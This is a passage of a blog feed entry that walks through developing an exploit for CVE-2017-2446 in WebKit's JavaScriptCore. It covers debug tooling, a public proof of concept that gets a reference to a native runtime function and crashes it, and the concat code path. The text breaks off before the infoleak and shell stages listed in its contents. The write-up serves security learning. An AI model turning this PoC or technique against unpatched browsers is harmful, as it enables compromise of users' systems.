<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Diary of a reverse-engineer - exploitation</title><link href="/" rel="alternate"></link><link href="/feeds/category.exploitation.atom.xml" rel="self"></link><id>/</id><updated>2018-07-14T18:49:00-07:00</updated><entry><title>CVE-2017-2446 or JSC::JSGlobalObject::isHavingABadTime.</title><link href="/blog/2018/07/14/cve-2017-2446-or-jscjsglobalobjectishavingabadtime/" rel="alternate"></link><published>2018-07-14T18:49:00-07:00</published><updated>2018-07-14T18:49:00-07:00</updated><author><name>yrp</name></author><id>tag:None,2018-07-14:/blog/2018/07/14/cve-2017-2446-or-jscjsglobalobjectishavingabadtime/</id><summary type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
&lt;p&gt;This post will cover the development of an exploit for JavaScriptCore (JSC) from the perspective of someone with no background in browser exploitation.&lt;/p&gt;
&lt;p&gt;Around the start of the year, I was pretty burnt out on CTF problems and was interested in writing an exploit for something more complicated and practical. I settled on writing a WebKit exploit for a few reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;It is code that is broadly used in the real world&lt;/li&gt;
&lt;li&gt;Browsers seemed like a cool target in an area I had little familiarity (both C++ and interpreter exploitation.)&lt;/li&gt;
&lt;li&gt;WebKit is (supposedly) the softest of the major browser targets.&lt;/li&gt;
&lt;li&gt;There were good existing resources on WebKit exploitation, namely &lt;a href="http://phrack.org/papers/attacking_javascript_engines.html"&gt;saelo’s Phrack article&lt;/a&gt;, as well as a variety of public console exploits.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;With this in mind, I got a recommendation for an interesting looking bug that has not previously been publicly exploited: &lt;a href="https://twitter.com/natashenka"&gt;@natashenka&lt;/a&gt;’s CVE-2017-2446 from the &lt;a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1032"&gt;project zero bugtracker&lt;/a&gt;. The bug report had a PoC which crashed in &lt;code&gt;memcpy()&lt;/code&gt; with some partially controlled registers, which is always a promising start.&lt;/p&gt;
&lt;p&gt;This post assumes you’ve read saelo’s Phrack article linked above, particularly the portions on NaN boxing and butterflies -- I can’t do a better job of explaining these concepts than the article. Additionally, you should be able to run a browser/JavaScript engine in a debugger -- we will target Linux for this post, but the concepts should translate to your preferred platform/debugger.&lt;/p&gt;
&lt;p&gt;Finally, the goal of doing this initially and now writing it up was and is to learn as much as possible. There is clearly a lot more for me to learn in this area, so if you read something that is incorrect, inefficient, unstable, a bad idea, or just have some thoughts to share, I’d love to hear from you.&lt;/p&gt;
</summary><content type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
&lt;p&gt;This post will cover the development of an exploit for JavaScriptCore (JSC) from the perspective of someone with no background in browser exploitation.&lt;/p&gt;
&lt;p&gt;Around the start of the year, I was pretty burnt out on CTF problems and was interested in writing an exploit for something more complicated and practical. I settled on writing a WebKit exploit for a few reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;It is code that is broadly used in the real world&lt;/li&gt;
&lt;li&gt;Browsers seemed like a cool target in an area I had little familiarity (both C++ and interpreter exploitation.)&lt;/li&gt;
&lt;li&gt;WebKit is (supposedly) the softest of the major browser targets.&lt;/li&gt;
&lt;li&gt;There were good existing resources on WebKit exploitation, namely &lt;a href="http://phrack.org/papers/attacking_javascript_engines.html"&gt;saelo’s Phrack article&lt;/a&gt;, as well as a variety of public console exploits.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;With this in mind, I got a recommendation for an interesting looking bug that has not previously been publicly exploited: &lt;a href="https://twitter.com/natashenka"&gt;@natashenka&lt;/a&gt;’s CVE-2017-2446 from the &lt;a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1032"&gt;project zero bugtracker&lt;/a&gt;. The bug report had a PoC which crashed in &lt;code&gt;memcpy()&lt;/code&gt; with some partially controlled registers, which is always a promising start.&lt;/p&gt;
&lt;p&gt;This post assumes you’ve read saelo’s Phrack article linked above, particularly the portions on NaN boxing and butterflies -- I can’t do a better job of explaining these concepts than the article. Additionally, you should be able to run a browser/JavaScript engine in a debugger -- we will target Linux for this post, but the concepts should translate to your preferred platform/debugger.&lt;/p&gt;
&lt;p&gt;Finally, the goal of doing this initially and now writing it up was and is to learn as much as possible. There is clearly a lot more for me to learn in this area, so if you read something that is incorrect, inefficient, unstable, a bad idea, or just have some thoughts to share, I’d love to hear from you.&lt;/p&gt;


&lt;div class="toc"&gt;&lt;span class="toctitle"&gt;Table of contents:&lt;/span&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#introduction"&gt;Introduction&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#target-setup-and-tooling"&gt;Target Setup and Tooling&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#target-modifications"&gt;Target modifications&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#other-useful-jsc-features"&gt;Other useful jsc features&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#symbols"&gt;Symbols&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#dumping-object-layouts"&gt;Dumping Object Layouts&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#bug"&gt;Bug&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#infoleak"&gt;Infoleak&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#concat-in-more-detail"&gt;concat in more detail&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#jsobject-layouts"&gt;JSObject layouts&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#salvation-through-symbols"&gt;Salvation Through Symbols&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#diagrams"&gt;Diagrams&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#oob-memory-is-a-large-value"&gt;OOB memory is a large value&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#oob-memory-is-a-zero"&gt;OOB Memory is a zero&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#notes-on-fastmalloc"&gt;Notes on fastMalloc&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#arbitrary-write"&gt;Arbitrary Write&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#failure-nan-boxing"&gt;Failure: NaN boxing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#failure-smashing-fastmalloc"&gt;Failure: Smashing fastMalloc&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#control-flow"&gt;Control Flow&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#intldatetimeformat-crash"&gt;Intl.DateTimeFormat Crash&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#exploit-planning"&gt;Exploit Planning&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#one_gadget"&gt;one_gadget&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#memory-layout-and-rop"&gt;Memory layout and ROP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#reverse-gadgets"&gt;Reverse gadgets&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#putting-it-all-together"&gt;Putting it all together&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#conclusion"&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id="target-setup-and-tooling"&gt;Target Setup and Tooling&lt;/h2&gt;
&lt;p&gt;First, we need a vulnerable version of WebKit. &lt;a href="https://github.com/WebKit/webkit/tree/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore"&gt;&lt;code&gt;e72e58665d57523f6792ad3479613935ecf9a5e0&lt;/code&gt;&lt;/a&gt; is the hash of the last vulnerable version (the fix is in &lt;a href="https://github.com/WebKit/webkit/commit/f7303f96833aa65a9eec5643dba39cede8d01144"&gt;&lt;code&gt;f7303f96833aa65a9eec5643dba39cede8d01144&lt;/code&gt;&lt;/a&gt;) so we check out and build off this.&lt;/p&gt;
&lt;p&gt;To stay in more familiar territory, I decided to only target the &lt;code&gt;jsc&lt;/code&gt; binary, not WebKit browser as a whole. &lt;code&gt;jsc&lt;/code&gt; is a thin command line wrapper around &lt;code&gt;libJavaScriptCore&lt;/code&gt;, the library WebKit uses for its JavaScript engine. This means any exploit for &lt;code&gt;jsc&lt;/code&gt;, with some modification, should also work in WebKit. I’m not sure if this was a good idea in retrospect -- it had the benefit of resulting in a stable heap as well as reducing the amount of code I had to read and understand, but had fewer codepaths and objects available for the exploit.&lt;/p&gt;
&lt;p&gt;I decided to target WebKit on Linux instead of macOS mainly due to debugger familiarity (gdb + &lt;a href="https://github.com/hugsy/gef"&gt;gef&lt;/a&gt;). For code browsing, I ended up using &lt;code&gt;vim&lt;/code&gt; and &lt;code&gt;rtags&lt;/code&gt;, which was… okay. If you have suggestions for C++ code auditing, I’d like to hear them.&lt;/p&gt;
&lt;h3 id="target-modifications"&gt;Target modifications&lt;/h3&gt;
&lt;p&gt;I found that I frequently wanted to breakpoint in my scripts to examine the interpreter state. After screwing around with this for a while I eventually just added a &lt;code&gt;dbg()&lt;/code&gt; function to &lt;code&gt;jsc&lt;/code&gt;. This would allow me to write code like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;dbg&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;// examine the memory layout&lt;/span&gt;
&lt;span class="nx"&gt;foo&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;// do something&lt;/span&gt;
&lt;span class="nx"&gt;dbg&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;//see how things have changed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The patch to add &lt;code&gt;dbg()&lt;/code&gt; to &lt;code&gt;jsc&lt;/code&gt; is pretty straightforward.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gh"&gt;diff --git diff --git a/Source/JavaScriptCore/jsc.cpp b/Source/JavaScriptCore/jsc.cpp&lt;/span&gt;
&lt;span class="gh"&gt;index bda9a09d0d2..d359518b9b6 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/Source/JavaScriptCore/jsc.cpp&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/Source/JavaScriptCore/jsc.cpp&lt;/span&gt;
&lt;span class="gu"&gt;@@ -994,6 +994,7 @@ static EncodedJSValue JSC_HOST_CALL functionSetHiddenValue(ExecState*);&lt;/span&gt;
 static EncodedJSValue JSC_HOST_CALL functionPrintStdOut(ExecState*);
 static EncodedJSValue JSC_HOST_CALL functionPrintStdErr(ExecState*);
 static EncodedJSValue JSC_HOST_CALL functionDebug(ExecState*);
&lt;span class="gi"&gt;+static EncodedJSValue JSC_HOST_CALL functionDbg(ExecState*);&lt;/span&gt;
 static EncodedJSValue JSC_HOST_CALL functionDescribe(ExecState*);
 static EncodedJSValue JSC_HOST_CALL functionDescribeArray(ExecState*);
 static EncodedJSValue JSC_HOST_CALL functionSleepSeconds(ExecState*);
&lt;span class="gu"&gt;@@ -1218,6 +1219,7 @@ protected:&lt;/span&gt;

         addFunction(vm, &amp;quot;debug&amp;quot;, functionDebug, 1);
         addFunction(vm, &amp;quot;describe&amp;quot;, functionDescribe, 1);
&lt;span class="gi"&gt;+        addFunction(vm, &amp;quot;dbg&amp;quot;, functionDbg, 0);&lt;/span&gt;
         addFunction(vm, &amp;quot;describeArray&amp;quot;, functionDescribeArray, 1);
         addFunction(vm, &amp;quot;print&amp;quot;, functionPrintStdOut, 1);
         addFunction(vm, &amp;quot;printErr&amp;quot;, functionPrintStdErr, 1);
&lt;span class="gu"&gt;@@ -1752,6 +1754,13 @@ EncodedJSValue JSC_HOST_CALL functionDebug(ExecState* exec)&lt;/span&gt;
     return JSValue::encode(jsUndefined());
 }

&lt;span class="gi"&gt;+EncodedJSValue JSC_HOST_CALL functionDbg(ExecState* exec)&lt;/span&gt;
&lt;span class="gi"&gt;+{&lt;/span&gt;
&lt;span class="gi"&gt;+       asm(&amp;quot;int3;&amp;quot;);&lt;/span&gt;
&lt;span class="gi"&gt;+&lt;/span&gt;
&lt;span class="gi"&gt;+       return JSValue::encode(jsUndefined());&lt;/span&gt;
&lt;span class="gi"&gt;+}&lt;/span&gt;
&lt;span class="gi"&gt;+&lt;/span&gt;
 EncodedJSValue JSC_HOST_CALL functionDescribe(ExecState* exec)
 {
     if (exec-&amp;gt;argumentCount() &amp;lt; 1)
&lt;/pre&gt;&lt;/div&gt;


&lt;h3 id="other-useful-jsc-features"&gt;Other useful &lt;code&gt;jsc&lt;/code&gt; features&lt;/h3&gt;
&lt;p&gt;Two helpful functions added to the interpreter by &lt;code&gt;jsc&lt;/code&gt; are &lt;code&gt;describe()&lt;/code&gt; and &lt;code&gt;describeArray()&lt;/code&gt;. As these functions would not be present in an actual target interpreter, they are not fair game for use in an exploit, however are very useful when debugging:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; a = [0x41, 0x42];
65,66
&amp;gt;&amp;gt;&amp;gt; describe(a);
Object: 0x7fc5663b01f0 with butterfly 0x7fc5663caec8 (0x7fc5663eac20:[Array, {}, ArrayWithInt32, Proto:0x7fc5663e4140, Leaf]), ID: 88
&amp;gt;&amp;gt;&amp;gt; describeArray(a);
&amp;lt;Butterfly: 0x7fc5663caec8; public length: 2; vector length: 3&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3 id="symbols"&gt;Symbols&lt;/h3&gt;
&lt;p&gt;Release builds of WebKit don’t have asserts enabled, but they also don’t have symbols. Since we want symbols, we will build with &lt;code&gt;CFLAGS=-g CXXFLAGS=-g Scripts/Tools/build-webkit --jsc-only&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The symbol information can take quite some time to parse by the debugger. We can reduce the load time of the debugger significantly by running &lt;code&gt;gdb-add-index&lt;/code&gt; on both &lt;code&gt;jsc&lt;/code&gt; and &lt;code&gt;libJavaScriptCore.so&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id="dumping-object-layouts"&gt;Dumping Object Layouts&lt;/h3&gt;
&lt;p&gt;WebKit ships with a script for macOS to dump the object layout of various classes, for example, here is &lt;code&gt;JSC::JSString&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~/WebKit/Tools/Scripts$ ./dump-class-layout JSC JSString
Found 1 types matching &amp;quot;JSString&amp;quot; in &amp;quot;/home/x/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so&amp;quot;
  +0 { 24} JSString
  +0 {  8}     JSC::JSCell
  +0 {  1}         JSC::HeapCell
  +0 &amp;lt;  4&amp;gt;         JSC::StructureID m_structureID;
  +4 &amp;lt;  1&amp;gt;         JSC::IndexingType m_indexingTypeAndMisc;
  +5 &amp;lt;  1&amp;gt;         JSC::JSType m_type;
  +6 &amp;lt;  1&amp;gt;         JSC::TypeInfo::InlineTypeFlags m_flags;
  +7 &amp;lt;  1&amp;gt;         JSC::CellState m_cellState;
  +8 &amp;lt;  4&amp;gt;     unsigned int m_flags;
 +12 &amp;lt;  4&amp;gt;     unsigned int m_length;
 +16 &amp;lt;  8&amp;gt;     WTF::String m_value;
 +16 &amp;lt;  8&amp;gt;         WTF::RefPtr&amp;lt;WTF::StringImpl&amp;gt; m_impl;
 +16 &amp;lt;  8&amp;gt;             WTF::StringImpl * m_ptr;
Total byte size: 24
Total pad bytes: 0
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This script required minor modifications to run on linux, but it was quite useful later on.&lt;/p&gt;
&lt;h2 id="bug"&gt;Bug&lt;/h2&gt;
&lt;p&gt;With our target built and tooling set up, let’s dig into the bug a bit. JavaScript (apparently) has a feature to get the caller of a function:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;q&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;q&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;caller&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;g&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nx"&gt;g&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;// ‘q’ is now equal to ‘g’&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This behavior is disabled under certain conditions, notably if the JavaScript code is running in strict mode. The specific bug here is that if you called from a strict function to a non-strict function, JSC would allow you to get a reference to the strict function. From the PoC provided you can see how this is a problem:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;q&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="c1"&gt;// this is a non-strict chunk of code, so getting the caller is allowed&lt;/span&gt;
&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;g&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
    &lt;span class="nx"&gt;q&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;g&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;caller&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="c1"&gt;// when anything, including the runtime, accesses a[3], g will be called&lt;/span&gt;
&lt;span class="nb"&gt;Object&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;defineProperty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;Array&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;prototype&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;g&lt;/span&gt;&lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="c1"&gt;// trigger the runtime access of a[3]&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// q now is a reference to an internal runtime function&lt;/span&gt;
&lt;span class="nx"&gt;q&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x77777777&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x77777777&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// crash&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In this case, the &lt;code&gt;concat&lt;/code&gt; code is in &lt;a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore/builtins/ArrayPrototype.js#L713"&gt;&lt;code&gt;Source/JavaScriptCore/builtins/ArrayPrototype.js&lt;/code&gt;&lt;/a&gt; and is marked as ‘use strict’.&lt;/p&gt;
&lt;p&gt;This behavior is not always exploitable: we need a JS runtime function ‘a’ which performs sanitization on arguments, then calls another runtime function ‘b’ which can be coerced into executing user supplied JavaScript to get a function reference to ‘b’. This will allow you to do &lt;code&gt;b(0x41, 0x42)&lt;/code&gt;, skipping the sanitization on your inputs which ‘a’ would normally perform.&lt;/p&gt;
&lt;p&gt;The JSC runtime is a combination of JavaScript and C++ which kind of looks like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+-------------+
| User Code   | &amp;lt;- user-provided code
+-------------+
| JS Runtime  | &amp;lt;- JS that ships with the browser as part of the runtime
+-------------+
| Cpp Runtime | &amp;lt;- C++ that implements the rest of the runtime
+-------------+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The &lt;code&gt;Array.concat&lt;/code&gt; above is a good example of this pattern: when &lt;code&gt;concat()&lt;/code&gt; is called it first goes into &lt;code&gt;ArrayPrototype.js&lt;/code&gt; to perform sanitization on the argument, then calls into one of the concat implementations. The fastpath implementations are generally written in C++, while the slowpaths are either pure JS, or a different C++ implementation.&lt;/p&gt;
&lt;p&gt;What makes this bug useful is the reference to the function we get (‘q’ in the above snippet) is &lt;em&gt;after&lt;/em&gt; the input sanitization performed by the JavaScript layer, meaning we have a direct reference to the native function.&lt;/p&gt;
&lt;p&gt;The provided PoC is an especially powerful example of this, however there are others -- some useful, some worthless. In terms of a general plan, we’ll need to use this bug to create an infoleak to defeat ASLR, then figure out a way to use it to hijack control flow and get a shell out of it.&lt;/p&gt;
&lt;h2 id="infoleak"&gt;Infoleak&lt;/h2&gt;
&lt;p&gt;Defeating ASLR is the first order of business. To do this, we need to understand the reference we have in the &lt;code&gt;concat&lt;/code&gt; code.&lt;/p&gt;
&lt;h3 id="concat-in-more-detail"&gt;&lt;code&gt;concat&lt;/code&gt; in more detail&lt;/h3&gt;
&lt;p&gt;Tracing the codepath from our &lt;code&gt;concat&lt;/code&gt; call, we start in &lt;a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore/builtins/ArrayPrototype.js#L713"&gt;&lt;code&gt;Source/JavaScriptCore/builtins/ArrayPrototype.js&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;first&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;use strict&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="c1"&gt;// [1] perform some input validation&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nx"&gt;argumentCount&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
        &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nx"&gt;isJSArray&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nx"&gt;isConcatSpreadableSymbol&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="kc"&gt;undefined&lt;/span&gt;
        &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nx"&gt;isObject&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;first&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nx"&gt;first&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nx"&gt;isConcatSpreadableSymbol&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="kc"&gt;undefined&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;

        &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nx"&gt;concatMemcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;first&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// [2] call the fastpath&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;result&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="c1"&gt;// … snip ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In this code snippet the &lt;code&gt;@&lt;/code&gt; is the interpreter glue which tells the JavaScript engine to look in the C++ bindings for the specified symbol. These functions are only callable via the JavaScript runtime which ships with Webkit, not user code. If you follow this through some indirection, you will find &lt;code&gt;@concatMemcpy&lt;/code&gt; corresponds to &lt;code&gt;arrayProtoPrivateFuncAppendMemcpy&lt;/code&gt; in  &lt;a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore/runtime/ArrayPrototype.cpp#L1309"&gt;&lt;code&gt;Source/JavaScriptCore/runtime/ArrayPrototype.cpp&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;EncodedJSValue&lt;/span&gt; &lt;span class="n"&gt;JSC_HOST_CALL&lt;/span&gt; &lt;span class="nf"&gt;arrayProtoPrivateFuncAppendMemcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ExecState&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
